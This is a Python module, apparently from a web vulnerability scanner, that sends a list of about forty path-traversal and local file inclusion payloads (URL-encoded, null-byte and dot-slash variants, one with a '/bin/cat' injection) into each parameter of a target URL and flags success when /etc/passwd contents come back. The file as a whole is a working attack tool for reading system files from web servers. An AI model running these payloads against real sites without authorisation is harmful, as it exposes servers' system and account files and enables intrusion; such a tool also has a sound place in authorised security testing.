from requests import get

from modules.logger import Logger


class TestLFI:
    def __init__(self):
        self.log = Logger()

        self.lfi_tests = [
            r"../../../../../etc/passwd",
            r"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2"
            + r"e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            r"..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd",
            r"\\&apos;/bin/cat%20/etc/passwd\\&apos;",
            r"/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            r"/..%c0%af../..%c0%af../..%c0%af../..%c0"
            + r"%af../..%c0%af../..%c0%af../etc/passwd",
            r"/etc/default/passwd",
            r"/./././././././././././etc/passwd",
            r"/../../../../../../../../../../etc/passwd",
            r"/../../../../../../../../../../etc/passwd^^",
            r"/..\../..\../..\../..\../..\../..\../etc/passwd",
            r"/etc/passwd",
            r"%0a/bin/cat%20/etc/passwd",
            r"%00../../../../../../etc/passwd",
            r"%00/etc/passwd%00",
            r"../../../../../../../../../../../../"
            + r"../../../../../../../../../../etc/passwd",
            r"../../etc/passwd",
            r"../etc/passwd",
            r".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
            r"etc/passwd",
            r"/etc/passwd%00",
            r"../../../../../../../../../../../../../"
            + r"../../../../../../../../../etc/passwd%00",
            r"../../etc/passwd%00",
            r"../etc/passwd%00",
            r"/../../../../../../../../../../../etc/passwd%00.html",
            r"/../../../../../../../../../../../etc/passwd%00.jpg",
            r"/../../../../../../../../../../../etc/passwd%00.php",
            r"/../../../../../../../../../../../etc/passwd%00.txt",
            r"../../../../../../etc/passwd&=%3C%3C%3C%3C",
            r"....\/....\/....\/....\/....\/....\/....\/....\/"
            + r"....\/....\/....\/....\/....\/....\/....\/....\/"
            + r"....\/....\/....\/....\/....\/....\/etc/passwd",
            r"....\/....\/etc/passwd",
            r"....\/etc/passwd",
            r"....//....//....//....//....//....//....//....//"
            + r"....//....//....//....//....//....//....//"
            + r"....//....//....//....//....//....//....//etc/passwd",
            r"....//....//etc/passwd",
            r"....//etc/passwd",
            r"/etc/security/passwd",
            r"///////../../../etc/passwd",
            r"..2fetc2fpasswd",
            r"..2fetc2fpasswd%00",
            r"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f.."
            + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd",
            r"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f.."
            + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00"
        ]


    def exploit_lfi(self, base_url, url_params):
        for param in url_params:
            for test in self.lfi_tests:
                # create a new url with the test as the value of the url_params
                test_url = f"{base_url}?{param}={test}"
                # send a request to the new url
                try:
                    response = get(test_url)
                except ConnectionError:
                    self.log.logger(
                        r"error",
                        "Connection error raised on: {test_url}, skipping"
                    )
                    continue
                else:
                    # if the response is 200, the test was successful
                    if (
                        response.text.find(
                                "root:x:0:0:root:/root:/bin/bash"
                            ) != -1
                        ):
                        self.log.logger("success", f"LFI on : {test_url}")
                        break

    def test_lfi(self, url):
        """
        Test for LFI
        """
        # split the url into the base url and the parameters
        base_url = url.split("?")[0]
        params = url.split("?")[1]
        # get the parameters from the url
        params_dict = params.split("&")
        # exploit the lfi
        self.exploit_lfi(base_url, params_dict)
